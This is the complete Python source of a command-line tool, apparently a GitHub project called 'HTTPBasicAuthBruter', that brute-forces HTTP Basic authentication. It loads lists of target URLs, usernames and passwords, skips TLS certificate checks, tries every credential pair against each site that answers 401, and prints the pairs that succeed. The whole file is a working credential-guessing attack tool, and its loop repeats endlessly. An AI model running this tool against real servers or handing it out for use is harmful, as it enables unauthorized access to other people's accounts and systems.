import argparse
import requests
from requests.auth import HTTPBasicAuth
from threading import Thread
import time
from colorama import init, Fore, Back, Style
import pdb
import urllib3
import ssl
urllib3.disable_warnings()

class File():
    def __init__(self, fileName, mode):
        self.fileName = fileName
        self.mode = mode

    def __enter__(self):
        self.f = open(self.fileName, self.mode)
        return self.f

    def __exit__(self, exc_type, exc_val, exc_tb):
        self.f.close()

class Attack:
    def __init__(self):
        self.parser = argparse.ArgumentParser(description="HTTPBasicAuthBruter v1 && github.com/ferhatcil")
        self.parser.add_argument('-U', '--users', required=False, help="you can upload a txt file filled with usernames")
        self.parser.add_argument('-P', '--passwords', required=False, help="you can upload a txt file filled with passwords")
        self.parser.add_argument('-u', '--user', required=False, help="you can specify only one username")
        self.parser.add_argument('-p', '--password', required=False, help="you can specify only one password")
        self.parser.add_argument('-D', '--domains', required=False, help="you can upload a txt file filled with domains")
        self.parser.add_argument('-d', '--domain', required=False, help="you can specify only one domain")
        #self.parser.add_argument('-t', '--threads', required=False, type=int, choices=range(1, 10), default=1)
        self.parser.add_argument('-v', action='store_true', default=False, help="you can upload a txt file filled with usernames")
        self.args = self.parser.parse_args()
        self.status = False
        self.loader()
    
    def loader(self):
        self.users = []
        self.passwords = []
        self.domains = []

        if (self.args.users):
            with File(self.args.users, 'r') as file:
                for line in file:
                    self.users.append(line.strip().split(" ")[0])

        if (self.args.passwords):
             with File(self.args.passwords, 'r') as file:
                for line in file:
                    self.passwords.append(line.strip().split(" ")[0])

        if (self.args.domains):
             with File(self.args.domains, 'r') as file:
                for line in file:
                    self.domains.append(line.strip().split(" ")[0])

        if (self.args.user):
            self.users.append(self.args.user)

        if (self.args.password):
            self.passwords.append(self.args.password)

        if (self.args.domain):
            self.domains.append(self.args.domain)
        
        self.bruter(self.domains, self.users, self.passwords, self.args.v)
                                
    def bruter(self, url, users, passwords, verbose):
        while True:
            try:
                for url in self.domains:
                    #pdb.set_trace()
                    try:
                        r = requests.get(url, verify=ssl.CERT_NONE)
                    except requests.ConnectionError:
                        continue
                    self.status = False
                    if r.status_code == 401:
                        for user in users:
                            for passw in passwords:
                                resp = requests.get(url, auth = HTTPBasicAuth(username=user, password=passw), verify=ssl.CERT_NONE)
                                if (resp.status_code == 200):
                                    print(Fore.GREEN + "[+]" + Style.RESET_ALL + " {} username: {} password: {}".format(url,user,passw))
                                    self.status = True
                                    break
                                elif(verbose == True):
                                    print(Fore.RED + "[-]" + Style.RESET_ALL + " {} username: {} password: {}".format(url,user,passw))
                            if self.status == True:
                                break
                    elif(verbose==True):
                        print(Fore.RED + "[-]" + Style.RESET_ALL + " There is no HTTPBasicAuth at the {} address".format(url))
            except requests.exceptions.SSLError:
                print("ssl")
            except requests.exceptions.ConnectionError:
                pass

if __name__ == '__main__':
    try:
        go = Attack()
    except KeyboardInterrupt:
        print(" GoodBye!")
